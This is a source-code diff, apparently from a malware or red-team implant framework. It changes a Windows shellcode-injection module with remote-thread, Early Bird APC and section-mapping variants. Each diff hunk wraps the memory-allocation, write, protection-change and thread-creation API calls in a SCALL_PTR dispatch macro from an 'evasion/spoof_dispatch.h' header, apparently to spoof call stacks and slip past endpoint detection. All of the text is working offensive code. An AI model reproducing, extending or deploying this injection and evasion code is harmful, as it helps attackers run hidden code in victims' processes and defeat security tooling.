@@ -31,6 +31,7 @@
 
 #include <constexpr.h>
 #include <stdint.h>
+#include <evasion/spoof_dispatch.h>
 
 #define INJECT_CRT     0
 #define INJECT_APC     1
@@ -86,18 +87,18 @@ static auto declfn inject_shellcode(
          !pVirtualProtectEx || !pCreateRemoteThread )
         return nullptr;
 
-    LPVOID remote_mem = pVirtualAllocEx(
+    LPVOID remote_mem = (LPVOID)SCALL_PTR( inst, pVirtualAllocEx,
         h_proc, nullptr, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
     if ( !remote_mem ) return nullptr;
 
     SIZE_T written = 0;
-    if ( !pWriteProcessMemory( h_proc, remote_mem, data, len, &written ) )
+    if ( !SCALL_PTR( inst, pWriteProcessMemory, h_proc, remote_mem, data, len, &written ) )
         return nullptr;
 
     DWORD old_protect = 0;
-    pVirtualProtectEx( h_proc, remote_mem, len, PAGE_EXECUTE_READ, &old_protect );
+    SCALL_PTR( inst, pVirtualProtectEx, h_proc, remote_mem, len, PAGE_EXECUTE_READ, &old_protect );
 
-    return pCreateRemoteThread(
+    return (HANDLE)SCALL_PTR( inst, pCreateRemoteThread,
         h_proc, nullptr, 0,
         (LPTHREAD_START_ROUTINE)remote_mem, nullptr, 0, nullptr );
 }
@@ -140,19 +141,19 @@ static auto declfn inject_shellcode(
          !pVirtualProtectEx || !pQueueUserAPC || !pCreateRemoteThread )
         return nullptr;
 
-    LPVOID remote_mem = pVirtualAllocEx(
+    LPVOID remote_mem = (LPVOID)SCALL_PTR( inst, pVirtualAllocEx,
         h_proc, nullptr, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
     if ( !remote_mem ) return nullptr;
 
     SIZE_T written = 0;
-    if ( !pWriteProcessMemory( h_proc, remote_mem, data, len, &written ) )
+    if ( !SCALL_PTR( inst, pWriteProcessMemory, h_proc, remote_mem, data, len, &written ) )
         return nullptr;
 
     DWORD old_protect = 0;
-    pVirtualProtectEx( h_proc, remote_mem, len, PAGE_EXECUTE_READ, &old_protect );
+    SCALL_PTR( inst, pVirtualProtectEx, h_proc, remote_mem, len, PAGE_EXECUTE_READ, &old_protect );
 
     /* Create suspended thread, queue APC, then resume - Early Bird pattern */
-    HANDLE h_thread = pCreateRemoteThread(
+    HANDLE h_thread = (HANDLE)SCALL_PTR( inst, pCreateRemoteThread,
         h_proc, nullptr, 0,
         (LPTHREAD_START_ROUTINE)resolve::_api(
             k32, expr::hash_string( "SleepEx" ) ),
@@ -160,12 +161,12 @@ static auto declfn inject_shellcode(
 
     if ( !h_thread ) return nullptr;
 
-    pQueueUserAPC( (PAPCFUNC)remote_mem, h_thread, 0 );
+    SCALL_PTR( inst, pQueueUserAPC, (PAPCFUNC)remote_mem, h_thread, 0 );
 
     typedef DWORD ( WINAPI *fn_ResumeThread )( HANDLE );
     auto pResumeThread = reinterpret_cast<fn_ResumeThread>(
         resolve::_api( k32, expr::hash_string( "ResumeThread" ) ) );
-    if ( pResumeThread ) pResumeThread( h_thread );
+    if ( pResumeThread ) SCALL_PTR( inst, pResumeThread, h_thread );
 
     return h_thread;
 }
@@ -213,7 +214,7 @@ static auto declfn inject_shellcode(
     section_size.QuadPart = len;
 
     HANDLE h_section = nullptr;
-    NTSTATUS status = pNtCreateSection(
+    NTSTATUS status = (NTSTATUS)SCALL_PTR( inst, pNtCreateSection,
         &h_section, SECTION_ALL_ACCESS, nullptr, &section_size,
         PAGE_EXECUTE_READWRITE, SEC_COMMIT, nullptr );
     if ( status != 0 || !h_section ) return nullptr;
@@ -221,11 +222,11 @@ static auto declfn inject_shellcode(
     /* Map RW into current process to write shellcode */
     PVOID local_view = nullptr;
     SIZE_T view_size = 0;
-    status = pNtMapViewOfSection(
+    status = (NTSTATUS)SCALL_PTR( inst, pNtMapViewOfSection,
         h_section, (HANDLE)-1, &local_view, 0, len, nullptr,
         &view_size, 2 /* ViewUnmap */, 0, PAGE_READWRITE );
     if ( status != 0 || !local_view ) {
-        inst.kernel32.CloseHandle( h_section );
+        SCALL( inst, kernel32.CloseHandle, h_section );
         return nullptr;
     }
 
@@ -235,17 +236,17 @@ static auto declfn inject_shellcode(
     /* Map RX into remote process */
     PVOID remote_view = nullptr;
     SIZE_T remote_view_size = 0;
-    status = pNtMapViewOfSection(
+    status = (NTSTATUS)SCALL_PTR( inst, pNtMapViewOfSection,
         h_section, h_proc, &remote_view, 0, len, nullptr,
         &remote_view_size, 2, 0, PAGE_EXECUTE_READ );
 
     /* Unmap local view - no longer needed */
-    pNtUnmapViewOfSection( (HANDLE)-1, local_view );
-    inst.kernel32.CloseHandle( h_section );
+    SCALL_PTR( inst, pNtUnmapViewOfSection, (HANDLE)-1, local_view );
+    SCALL( inst, kernel32.CloseHandle, h_section );
 
     if ( status != 0 || !remote_view ) return nullptr;
 
-    return pCreateRemoteThread(
+    return (HANDLE)SCALL_PTR( inst, pCreateRemoteThread,
         h_proc, nullptr, 0,
         (LPTHREAD_START_ROUTINE)remote_view, nullptr, 0, nullptr );
 }
@@ -292,18 +293,18 @@ static auto declfn inject_shellcode(
          !pVirtualProtectEx || !pCreateRemoteThread )
         return nullptr;
 
-    LPVOID remote_mem = pVirtualAllocEx(
+    LPVOID remote_mem = (LPVOID)SCALL_PTR( inst, pVirtualAllocEx,
         h_proc, nullptr, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
     if ( !remote_mem ) return nullptr;
 
     SIZE_T written = 0;
-    if ( !pWriteProcessMemory( h_proc, remote_mem, data, len, &written ) )
+    if ( !SCALL_PTR( inst, pWriteProcessMemory, h_proc, remote_mem, data, len, &written ) )
         return nullptr;
 
     DWORD old_protect = 0;
-    pVirtualProtectEx( h_proc, remote_mem, len, PAGE_EXECUTE_READ, &old_protect );
+    SCALL_PTR( inst, pVirtualProtectEx, h_proc, remote_mem, len, PAGE_EXECUTE_READ, &old_protect );
 
-    return pCreateRemoteThread(
+    return (HANDLE)SCALL_PTR( inst, pCreateRemoteThread,
         h_proc, nullptr, 0,
         (LPTHREAD_START_ROUTINE)remote_mem, nullptr, 0, nullptr );
 }
